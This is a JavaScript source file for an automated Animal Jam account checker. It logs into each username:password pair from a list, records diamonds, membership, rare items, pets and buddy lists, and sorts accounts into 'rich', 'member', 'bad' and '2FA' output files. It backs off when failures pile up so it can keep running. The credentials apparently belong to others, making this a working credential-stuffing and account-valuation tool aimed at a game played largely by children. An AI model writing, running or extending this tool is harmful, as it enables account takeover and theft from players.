import { readFile, writeFile, mkdir, readdir, unlink, copyFile, access, watch } from 'fs/promises';
import { AnimalJamClient } from './animaljam.js/dist/index.js';
import { blue, green, yellow, red, cyan } from 'colorette';
import { loadJsonFile, loadJson, CheckClothWorth, sleep } from './utils.js';
import dns from 'dns/promises';
import readline from 'readline';
import path from 'path';

/* ============================================================
   CONFIG & CONSTANTS
============================================================ */
let RARE_CLOTHING_IDS;
let RARE_DENITEM_IDS;
let RARE_PET_IDS;
let IGNORE_VARIANT_RARE_IDS;
async function loadRareIds() {
  const data = JSON.parse(await readFile('./rare-ids.json', 'utf8'));
  RARE_CLOTHING_IDS = new Set(data.clothing);
  RARE_DENITEM_IDS  = new Set(data.denitems);
  RARE_PET_IDS      = new Set(data.pets);
  IGNORE_VARIANT_RARE_IDS = new Set(data.ignoreVariantRares);
  console.log('♻️ Reloaded rare-ids.json');
}

await loadRareIds();

// Hot-reload watcher (dev only)
watch('./rare-ids.json', async () => {
  try { await loadRareIds(); } catch (e) {
    console.error('⚠️ Failed to reload rare-ids.json:', e.message);
  }
});

const OUTPUT_DIR = './output';
const LOG_DIR = './checker-log';
await mkdir(OUTPUT_DIR, { recursive: true });
await mkdir(LOG_DIR, { recursive: true });

const CLOTHING_PATH   = './defpacks/1000-clothing.json';
const DENITEMS_PATH   = './defpacks/1030-denitems.json';
const ENSTRINGS_PATH  = './defpacks/10230-enstrings.json';
const PETS_PATH       = './defpacks/1046-pets.json';
const ACCOUNTS_FILE   = 'accounts.txt';
const RICH_FILE       = path.join(OUTPUT_DIR, 'rich-accounts.txt');
const MEMBER_FILE     = path.join(OUTPUT_DIR, 'rich-member-accounts.txt');
const BAD_FILE        = path.join(OUTPUT_DIR, 'bad-accounts.txt');
const TWOFA_FILE      = path.join(OUTPUT_DIR, '2fa-accounts.txt');
const CHECKED_FILE    = path.join(OUTPUT_DIR, 'CheckedAccounts.txt');
const SKIPPED_FILE    = path.join(OUTPUT_DIR, 'skipped-accounts.txt');
const CHECKPOINT_FILE = path.join(LOG_DIR, 'checkpoint.json');
const SMARTFOX_HOST   = 'lb-iss04-classic-prod.animaljam.com';

const RARE_KEYWORDS = ['headdress','rare hot magenta','rare spiked collar','blackout','coal','whiteout','rare spiked wristband','antique','exclusive','terrace','lavender','slime green','rare bright','bright orange','bright red','cyan'];

/* ============================================================
   UTILITIES
============================================================ */

function formatLine(screen_name, password, diamonds, isMember, clothingRares, denRares, creationYear, petName) {
  const main_width = 36; // wider gap for screen_name
  const col_width = 2;  // smaller width for other fields
  const pad = (label, value, width = col_width) =>
    `${label}: ${String(value).padEnd(3)}`.padEnd(width);
  const list = arr => (arr.length ? arr.join(', ') : 'none');
  const date = new Date();
  const options = {
    day: 'numeric',
    month: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
    hour12: true
  };
  const timeString = date.toLocaleString('en-AU', options);
return [
    `${screen_name}:${password}`.padEnd(main_width),
    pad('diamonds', diamonds),
    `[${timeString}]`.padEnd(25),            
    pad('member', isMember ? 'yes' : 'no'),
    `created: ${creationYear}`,
    `clothing: ${list(clothingRares)}`,
    `den: ${list(denRares)}`,
    `pets: ${list(petName)}`
].join(' | ');
}
async function fileExists(path) {
  try {
    await access(path);
    return true;
  } catch {
    return false;
  }
}
async function saveCheckpoint(index) {
  try {
    await writeFile(CHECKPOINT_FILE, JSON.stringify({ lastIndex: index }), 'utf8');
  } catch (err) {
    console.log(red(`⚠️ Failed to save checkpoint: ${err.message}`));
  }
}

async function loadCheckpoint() {
  try {
    const data = await readFile(CHECKPOINT_FILE, 'utf8');
    const json = JSON.parse(data);
    return Number.isInteger(json.lastIndex) ? json.lastIndex : 0;
  } catch {
    return 0;
  }
}

function containsRareKeyword(name = '') {
  if (!name) return false;
  const lower = name.toLowerCase();
  return RARE_KEYWORDS.some(keyword => lower.includes(keyword.toLowerCase()));
}

function addCount(map, name) {
  if (!name) return;
  const key = name.trim();
  map.set(key, (map.get(key) || 0) + 1);
}

function formatCountMap(map) {
  return Array.from(map.entries()).map(([name, count]) =>
    count > 1 ? `${count}x ${name}` : name
  );
}
async function countdown(seconds, label = 'waiting') {
  for (let i = seconds; i > 0; i--) {
    process.stdout.write(green(`\r⏳ ${label}: ${i}s `));
    await sleep(1000);
  }
  process.stdout.write('\r'.padEnd(40, ' ') + '\r');
}

const recentFailures = []; // store timestamps of failures (in ms)
const FAILURE_WINDOW_MS = 60_000; // 1 minute window

function recordFailure() {
  const now = Date.now();
  recentFailures.push(now);

  // cleanup anything older than 60 seconds
  while (recentFailures.length && now - recentFailures[0] > FAILURE_WINDOW_MS) {
    recentFailures.shift();
  }
}

function getRecentFailures() {
  const now = Date.now();
  // return only failures within the last 60 seconds
  return recentFailures.filter(t => now - t < FAILURE_WINDOW_MS);
}
async function appendOrReplaceLine(filePath, screen_name, newLine) {
  await mkdir(path.dirname(filePath), { recursive: true });
  let updated = false;
  let lines = [];
  try {
    const raw = await readFile(filePath, 'utf8');
    lines = raw.split('\n').map(l => l.trim()).filter(l => l);
    lines = lines.map(line => line.startsWith(screen_name + ':') ? (updated = true, newLine) : line);
  } catch {}
  if (!updated) lines.push(newLine);
  await writeFile(filePath, lines.join('\n'), 'utf8');
}

async function removeAccountFromFile(filePath, screen_name) {
  try {
    const raw = await readFile(filePath, 'utf8');
    const filtered = raw.split('\n').filter(l => !l.startsWith(screen_name + ':')).join('\n');
    await writeFile(filePath, filtered.trim() ? filtered.trim() + '\n' : '', 'utf8');
  } catch {}
}

async function markBadAccount(screen_name, password, reason) {
  const line = `${screen_name}:${password} | ${reason}`;
  const targetFile = reason === 'REQUIRES_2FA' ? TWOFA_FILE : BAD_FILE;
  await writeFile(targetFile, line + '\n', { flag: 'a' });
}

/* ============================================================
   DAILY BACKUP SYSTEM
============================================================ */

async function dailyBackup() {
  const now = new Date();
  const dateStamp = now.toISOString().split('T')[0];
  const backupFile = `${LOG_DIR}/accounts-${dateStamp}.txt`;

  try {
    const files = await readdir(LOG_DIR);
    if (!files.includes(`accounts-${dateStamp}.bak`) && await fileExists(ACCOUNTS_FILE)) {
      await copyFile(ACCOUNTS_FILE, backupFile);
      console.log(green(`💾 Daily backup created: ${backupFile}`));
    }

    const bakFiles = files.filter(f => f.startsWith('accounts-')).sort();
    while (bakFiles.length > 7) {
      const oldFile = bakFiles.shift();
      await unlink(`${LOG_DIR}/${oldFile}`);
      console.log(yellow(`🧹 Removed old backup: ${oldFile}`));
    }
  } catch (err) {
    console.log(red(`⚠️ Backup failed: ${err.message}`));
  }
}

/* ============================================================
   SMARTFOX HEARTBEAT & AUTO-PAUSE
============================================================ */

let smartFoxDownCount = 0;
let smartFoxPaused = false;

async function checkSmartFoxServer() {
  try {
    const { address } = await dns.lookup(SMARTFOX_HOST);
//    console.log(green(`✅ SmartFox reachable at ${address}`));
    return true;
  } catch {
    console.log(red('⚠️ SmartFox unreachable'));
    return false;
  }
}

async function heartbeatMonitor() {
  const isUp = await checkSmartFoxServer();
  if (!isUp) {
    smartFoxDownCount++;
    if (smartFoxDownCount >= 3 && !smartFoxPaused) {
      smartFoxPaused = true;
      console.log(red(`🚫 SmartFox appears DOWN — pausing checks until recovery...`));
    }
  } else {
    if (smartFoxPaused) console.log(green(`✅ SmartFox connection restored — resuming checks!`));
    smartFoxDownCount = 0;
    smartFoxPaused = false;
  }
}
setInterval(heartbeatMonitor, 60_000);

async function waitForSmartFoxIfDown() {
  while (smartFoxPaused) {
    console.log(yellow(`⏸️ Waiting for SmartFox to recover...`));
    await countdown(30, 'retrying SmartFox check');
  }
}
/* ============================================================
   ACCOUNT CHECKING LOGIC
============================================================ */

async function checkAccount(screen_name, password, clothing, denitems, enstrings) {
 try {
  const client    = new AnimalJamClient();
  const flashvars = await client.flashvars.fetch();

let auth_token = null;

const recentFailures = getRecentFailures();

if (recentFailures.length >= 15) {
  console.log(red(`🔒 RATE LIMIT WARNING — ${recentFailures.length} failures in the last minute`));
  console.log(yellow(`⏳ Sleeping 60 seconds to avoid hammering the server...`));
  await sleep(60000);
}

try {
  const auth = await client.authenticator.login({ screen_name, password });

  // 🔍 Debug output
  // console.log('🔍 Raw auth response:', JSON.stringify(auth, null, 2));

if (auth.auth_token) {
  auth_token = auth.auth_token;
} else if (auth.banned || auth.error_code === 102) {
  console.log(red(`❌ ${screen_name} is banned`));
  await markBadAccount(screen_name, password, 'BANNED');
  recordFailure();
  return { success: false, reason: 'BANNED' };
} else if (auth.error === 'invalid_password' || auth.error_code === 101) {
  console.log(red(`❌ Invalid password for ${screen_name}`));
  await markBadAccount(screen_name, password, 'INVALID_PASSWORD');
  recordFailure();
  return { success: false, reason: 'INVALID_PASSWORD' };
} else if (auth.error_code === 106) {
  console.log(red(`❌ ${screen_name} is disabled`));
  await markBadAccount(screen_name, password, 'DISABLED');
  recordFailure();
  return { success: false, reason: 'DISABLED' };
} else if (auth.error === 'pending_otp_confirmation') {
  console.log(red(`❌ ${screen_name} requires 2FA`));
  await markBadAccount(screen_name, password, 'REQUIRES_2FA');
  recordFailure();
  return { success: false, reason: 'REQUIRES_2FA' };
} else {
  console.log(red(`❌ Unknown error for ${screen_name}`));
  return { success: false, reason: 'UNKNOWN_LOGIN_ERROR' };
}

} catch (e) {
  console.log(red(`⚠️ Server error during login for ${screen_name}: ${e.message}`));
  await markBadAccount(screen_name, password, 'SERVER_ERROR');
  return { success: false };
}

const networking = await client.networking.createClient({
  host:           flashvars.smartfoxServer,
  port:           flashvars.smartfoxPort,
  auth_token,
  screen_name,
  deploy_version: flashvars.deploy_version,
});

  let userData        = null;
  let nextpacket      = false;
  const received      = { il: false, di: false };
  const clothingRares = new Map();
  const denRares      = new Map();
  const petCounts     = new Map();
    
networking.on('message', async message => {
  const msg = message.toMessage();
  if (msg.includes('playerWallSettings')) {
    try {
      const jsonData = await loadJson(msg);
      userData = jsonData?.b?.o?.params ?? null;

      if (!userData) {
        console.log(red('⚠️ playerWallSettings received but missing params'));
      }
    } catch (e) {
      console.log(red(`⚠️ Failed to parse playerWallSettings: ${e.message}`));
    }
  }

  const parts = msg.split('%');
  if (parts[1] !== 'xt') return;
  const cmd = parts[2];

// ---- PL (pet list) parser with JSON mapping and rare detection ----
if (cmd === 'pl') {
  const reportedCount = parseInt(parts[6], 10) || 0;
  console.log(yellow(`🐾 PL packet reports ${reportedCount} pets`));

  const startIndex = 9;
  const rawData = parts.slice(startIndex).join('%');
  const petBlocks = rawData.split('|');
  const pets = await loadJsonFile(PETS_PATH);

  let parsed = 0;

  function getPetId(valueAsDecimal) {
    const v = Number(valueAsDecimal) >>> 0;
    return v & 0xFF; // pet ID = lowest byte
  }

  for (const block of petBlocks) {
    if (parsed >= reportedCount) break;
    const trimmed = block.trim();
    if (!trimmed) continue;

    const fields = trimmed.split('%');
    if (fields.length < 2) continue; // invalid pet block

    const packed = fields[1];
    const petId = getPetId(packed);

    const def = pets[petId];
    const petName = def ? def.name : 'Unknown';

    if (RARE_PET_IDS.has(petId) || containsRareKeyword(petName)) {
      console.log(green(`💎 Rare pet detected: ID=${petId}, Name=${petName}`));
      addCount(petCounts, petName || `PetID:${petId}`);
    } else {
  //    console.log(cyan(`Pet ${parsed + 1}: ID=${petId}, Name=${petName}`));
    }

    parsed++;
  }

  // console.log(cyan(`🔍 Parsed ${parsed}/${reportedCount} pets`));
}

// ---- DI (den items) parser: regular + variant-aware rare detection ----
if (cmd === 'di') {
  const reportedCount = parseInt(parts[5], 10) || 0;
  console.log(yellow(`📦 DI packet reports ${reportedCount} items`));

  let idx = 7;
  let parsed = 0;
  const MAX_GUARD = 50000;

  while (parsed < reportedCount && idx < parts.length && parsed < MAX_GUARD) {
    const slot     = parseInt(parts[idx], 10);
    const itemId   = parseInt(parts[idx + 1], 10);
    const variantA = parseInt(parts[idx + 2], 10);
    const variantB = parseInt(parts[idx + 3], 10);
    const marker   = parts[idx + 4];

    if (Number.isNaN(slot) || Number.isNaN(itemId)) { idx++; continue; }
    if (marker !== 'true') { idx++; continue; }

    // Empty slot → skip quietly
    if (itemId === 0) {
      // console.log(yellow(`⤷ Empty den slot at slot ${slot}`));
      idx += 5; parsed++; continue;
    }

    // Detect & skip UUID-like extra fields
    let lookahead = idx + 5;
    while (lookahead < parts.length && !/^\d+$/.test(parts[lookahead])) lookahead++;
    const stride = lookahead - idx;

    const def  = denitems[itemId];
    const name = def ? (enstrings[def.nameStrId] || def.abbrName) : `Item ${itemId}`;

    // --- rare detection ---
    let isRare = RARE_DENITEM_IDS.has(itemId);

    // Drop rarity if ID is variant-dependent but both variants are zero
    if (isRare && IGNORE_VARIANT_RARE_IDS.has(itemId) && variantA === 0 && variantB === 0) {
      isRare = false;
    }

    // --- logging & naming ---
    const variantSuffix =
      variantA !== variantB && variantA > 0 && variantB > 0
        ? ` (v${variantA},v${variantB})`
        : (Math.max(variantA, variantB) > 0 ? ` (v${Math.max(variantA, variantB)})` : '');

    const fullName = `${name}${variantSuffix}`;

    if (isRare) {
      console.log(green(`💎 Rare den item detected: ${itemId} → ${fullName}`));
      addCount(denRares, fullName);
    } else if (variantA > 0 || variantB > 0) {
      // console.log(blue(`🔹 Variant den item: ${itemId} → ${fullName}`));
    }

    parsed++;
    idx = lookahead;
  }

  // console.log(cyan(`✅ Parsed ${parsed}/${reportedCount} den items`));
  received.di = true;
}
   
// ---- BL (buddy + block list) parser ----
if (cmd === 'bl') {
  const listType = parseInt(parts[4], 10) || 0;
  const isBlockList = listType === 1;
  const label = isBlockList ? '🚫 Block list' : '👯 Buddy list';

  console.log(yellow(`${label} packet received`));

  const entries = [];

  if (isBlockList) {
    // 🧱 Block list: %xt%bl%-1%1%<count>%<name1>%<name2>%...
    const count = parseInt(parts[5], 10) || 0;
    let idx = 6;
    for (let i = 0; i < count && idx < parts.length; i++, idx++) {
      const name = parts[idx]?.trim();
      if (name && /^[A-Za-z0-9_]+$/.test(name)) entries.push(name);
    }
  } else {
  // 👯 Buddy list: %xt%bl%-1%0%<unknownFlag>%<name>%<uuid>%<int>%<int>%...
  // Example: %xt%bl%-1%0%1%name%uuid%1%1%...
  const start = 5; // after %xt%bl%-1%
  const flagIndex = start + 2; // parts[5] = "0", parts[6] = flag ("1")
  let idx = flagIndex + 1;
  const entries = [];

  while (idx + 3 < parts.length) {
    const name = parts[idx]?.trim();
    const uuid = parts[idx + 1]?.trim();
    const isUuid = /^[0-9a-fA-F-]{32,36}$/.test(uuid);
    const online = parts[idx + 2] === '1';
    const sub = parts[idx + 3] === '1';

    if (name && isUuid) {
      entries.push({ name, uuid, online, sub });
      idx += 4;
    } else {
      idx++; // skip malformed tokens
    }
  }

  if (!entries.length) {
    console.log(red(`⚠️ No entries found in ${label} packet`));
    return;
  }

  console.log(yellow(`👯 Parsed ${entries.length} buddies`));

  // Write names only (same as before)
  const filePath = path.join(OUTPUT_DIR, 'buddies.txt');
  try {
    let existing = new Set();
    try {
      const data = await readFile(filePath, 'utf8');
      existing = new Set(data.split('\n').map(l => l.trim()).filter(Boolean));
    } catch {} // ignore if missing

    let added = 0;
    for (const b of entries) {
      if (!existing.has(b.name)) {
        existing.add(b.name);
        added++;
      }
    }

    if (added > 0) {
      await writeFile(filePath, Array.from(existing).join('\n') + '\n', 'utf8');
      console.log(green(`💾 Added ${added} new buddies (total ${existing.size})`));
    } else {
      console.log(cyan(`✅ No new buddies found`));
    }
  } catch (err) {
    console.error(red(`⚠️ Failed writing ${filePath}: ${err.message}`));
  }
 }
}
// ---- IL (clothing) parsing (ID-based rare detection + count-based parsing, no debug) ----
else if (cmd === 'il' && nextpacket) {
  nextpacket = false;
  const splits = msg.split('%');
  let parsedCount = 0;

  // clothing count is usually at index 10 (after username + pet count)
  const clothingCount = parseInt(splits[10], 10);
  if (isNaN(clothingCount) || clothingCount <= 0) {
    received.il = true;
    return;
  }

  // actual clothing data starts after index 11
  const startIndex = 11;

  for (let i = startIndex; i < splits.length && parsedCount < clothingCount; i += 5) {
    const id = splits[i];
    const color = splits[i + 2];

    if (!/^\d+$/.test(id)) continue;
    const itemId = parseInt(id, 10);
    if (itemId < 10) continue;
    if (!/^-?\d+$/.test(color)) continue;

    parsedCount++; // ✅ Count it regardless of definition

    const def = clothing[itemId];
    const name = def ? def.name : null;

    if (!def) continue;

    // ✅ Rare detection
    if (
      RARE_CLOTHING_IDS.has(itemId) ||
      (name && containsRareKeyword(name)) ||
      (name && CheckClothWorth(name))
    ) {
      console.log(cyan(`💎 Rare clothing item detected: ${itemId}${name ? ' → ' + name : ''}`));
      addCount(clothingRares, name || String(itemId));
    }
  }

  console.log(yellow(`👕 Parsed ${parsedCount} / ${clothingCount} clothing items`));
  received.il = true;
}

});

  networking.on('ready', async () => {
    await sleep(500);
    await networking.sendXTMessage(["bl", "-1"]);
    nextpacket = true;
    await networking.sendXTMessage(['di', '-1']);
    await networking.sendXTMessage(['pl', '-1', screen_name]); 
    await networking.sendXTMessage(['ad', '-1', screen_name, userData.perUserAvId, 1]);
    await networking.sendXTMessage(['il', '-1']);
  });

  await networking.connect();

  let tries = 0;
  while ((!userData || !received.di || !received.il) && tries++ < 60) {
    await sleep(500);  // total wait time = 30 seconds
  }

if (!userData) {
  console.log(red(`❌ Failed to retrieve userData for ${screen_name}`));
  networking.disconnect?.();
  return { success: false, reason: 'NO_USERDATA' };
}
      // Extract creation year
  const createdAtTimestamp = Number(userData?.createdAt || 0) * 1000;
  const creationYear = createdAtTimestamp ? new Date(createdAtTimestamp).getFullYear() : "unknown";

  networking.disconnect?.();

return {
  success: true,
  screen_name,
  diamonds: Number(userData.diamondsCount ?? 0),
  isMember: userData.accountType === 2,
  clothingRares: formatCountMap(clothingRares),
  denRares: formatCountMap(denRares),
  creationYear,
  petName: formatCountMap(petCounts),
};

} catch (err) {
    // handle login errors
    if (err.message.includes('2FA')) {
      await markBadAccount(screen_name, password, 'REQUIRES_2FA');
      return { success: false, reason: 'REQUIRES_2FA' };
    } else if (err.message.includes('invalid')) {
      await markBadAccount(screen_name, password, 'INVALID_LOGIN');
      return { success: false, reason: 'INVALID_LOGIN' };
    } else {
      console.log(red(`⚠️ Unknown error for ${screen_name}: ${err.message}`));
      return { success: false, reason: 'UNKNOWN_LOGIN_ERROR' };
    }
  }
}

// --- Pause control for unknown login errors ---
const UNKNOWN_FAIL_THRESHOLD = 3;   // how many in a row trigger a pause
const UNKNOWN_FAIL_PAUSE = 180;     // pause length in seconds (3 minutes)

/* ============================================================
   MAIN EXECUTION FLOW (core only shown)
============================================================ */

async function main() {
  await dailyBackup();

  if (!(await checkSmartFoxServer())) {
    console.log(red('Waiting for SmartFox…'));
    while (!(await checkSmartFoxServer())) await countdown(60, 'SmartFox retry');
  }

  const clothing  = await loadJsonFile(CLOTHING_PATH);
  const denitems  = await loadJsonFile(DENITEMS_PATH);
  const enstrings = await loadJsonFile(ENSTRINGS_PATH);

  let accounts = (await readFile(ACCOUNTS_FILE, 'utf8'))
    .split('\n')
    .map(l => l.trim())
    .filter(l => l.includes(':'));

  console.log(blue(`📋 Total accounts loaded: ${accounts.length}`));

  const lastCheckpoint = await loadCheckpoint();
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

const startIndex = await new Promise(resolve => {
  const timer = setTimeout(() => {
    console.log(yellow(`\n⌛ No input detected — auto-starting from checkpoint ${lastCheckpoint}...`));
    rl.close();
    resolve(lastCheckpoint);
  }, 8000); // 8-second auto-start timeout

  rl.question(
    yellow(
      `Resume from last checkpoint (index ${lastCheckpoint})? [Y/n/custom number]: `
    ),
    answer => {
      clearTimeout(timer);
      rl.close();
      const trimmed = answer.trim().toLowerCase();
      if (!trimmed || trimmed === 'y') {
        resolve(lastCheckpoint);
      } else if (/^\d+$/.test(trimmed)) {
        const num = parseInt(trimmed, 10);
        resolve(num >= 0 && num < accounts.length ? num : 0);
      } else {
        resolve(0);
      }
    }
  );
});


  console.log(green(`✅ Starting at index ${startIndex}`));
  const totalAccounts = accounts.length;
  console.log(blue(`Starting check of ${totalAccounts - startIndex} accounts from index ${startIndex}...`));

  const retryCounts = new Map();
  let consecutiveUnknownFails = 0;

for (let i = startIndex; i < accounts.length; i++) {
    const currentIndex = i; // or just assign currentIndex = i;
    await saveCheckpoint(currentIndex);

    await waitForSmartFoxIfDown();

    const [screen_name, password] = accounts[i].split(':');
    console.log(`\n=== Checking ${screen_name} (${currentIndex + 1}/${accounts.length}) ===`);

    const retryCount = retryCounts.get(screen_name) || 0;
    const result = await checkAccount(screen_name, password, clothing, denitems, enstrings);

if (!result.success) {
  const { reason } = result;

  // Handle UNKNOWN_LOGIN_ERROR
  if (reason === 'UNKNOWN_LOGIN_ERROR') {
    const retries = retryCounts.get(screen_name) || 0;

    if (retries < 2) {
      retryCounts.set(screen_name, retries + 1);
      console.log(yellow(`🔁 Retry ${retries + 1}/2 for ${screen_name}`));
      await countdown((2 ** retries) * 5, 'retry delay');
      i--;
      continue;
    } else {
      console.log(red(`❌ ${screen_name} failed after 2 retries — skipping.`));
      retryCounts.delete(screen_name);
      consecutiveUnknownFails++;

      const line = `${screen_name}:${password} | UNKNOWN_LOGIN_ERROR`;
      await appendOrReplaceLine(SKIPPED_FILE, screen_name, line);
    }
  } else {
    retryCounts.delete(screen_name);
    consecutiveUnknownFails = 0; // reset streak on any other result
  }

  // 🕒 Pause system after threshold reached
  if (consecutiveUnknownFails >= UNKNOWN_FAIL_THRESHOLD) {
    console.log(yellow(`⚠️ ${consecutiveUnknownFails} unknown failures in a row — pausing for ${UNKNOWN_FAIL_PAUSE / 60} minutes...`));
    await countdown(UNKNOWN_FAIL_PAUSE, 'cooldown');
    consecutiveUnknownFails = 0;
  }

  // 🪶 Handle other known skips
  if (reason === 'NO_USERDATA') {
    const line = `${screen_name}:${password} | NO_USERDATA`;
    await appendOrReplaceLine(SKIPPED_FILE, screen_name, line);
    await countdown(20, 'cooldown');
    continue;
  }

  // ❗ DO NOT delete on unknown errors
  if (
    reason !== 'UNKNOWN_LOGIN_ERROR' &&
    reason !== 'NO_USERDATA' &&
    reason !== 'SERVER_ERROR'
  ) {
    console.log(red(`Removing ${screen_name} — ${reason}`));
    accounts = accounts.filter(a => !a.startsWith(screen_name + ':'));
    await writeFile(ACCOUNTS_FILE, accounts.join('\n') + '\n', 'utf8');
    i--;
    await countdown(20, 'next account');
  }

  continue;
}

const { diamonds, isMember, clothingRares, denRares, creationYear, petName } = result;
const validPets = Array.isArray(petName) ? petName.filter(Boolean) : [];
const hasRarePet = validPets.length > 0;
const hasRare = clothingRares.length > 0 || denRares.length > 0 || hasRarePet;
const isRich  = diamonds >= 5 || hasRare;

console.log(cyan(`Diamonds: ${diamonds}`));
     
    if (isMember) {
      const line = formatLine(screen_name, password, diamonds, true, clothingRares, denRares, creationYear, petName);
      await appendOrReplaceLine(MEMBER_FILE, screen_name, line);
      console.log(green(`Logged member: ${screen_name}`));
    } else if (isRich) {
      const line = formatLine(screen_name, password, diamonds, false, clothingRares, denRares, creationYear, petName);
      await appendOrReplaceLine(RICH_FILE, screen_name, line);
      console.log(green(`Logged rich: ${screen_name}`));
    } else {
      await removeAccountFromFile(RICH_FILE, screen_name);
      await removeAccountFromFile(MEMBER_FILE, screen_name);

      const simpleLine = `${screen_name}:${password}`;
      await appendOrReplaceLine(CHECKED_FILE, screen_name, simpleLine);
      console.log(blue(`Logged clean: ${screen_name}`));

      accounts = accounts.filter(a => !a.startsWith(screen_name + ':'));
      await writeFile(ACCOUNTS_FILE, accounts.join('\n'), 'utf8');
      i--;
    }

    await countdown(21);
  }

  console.log(green('✅ All accounts processed.'));
}

main().catch(e => console.error(red('Fatal error:'), e));





















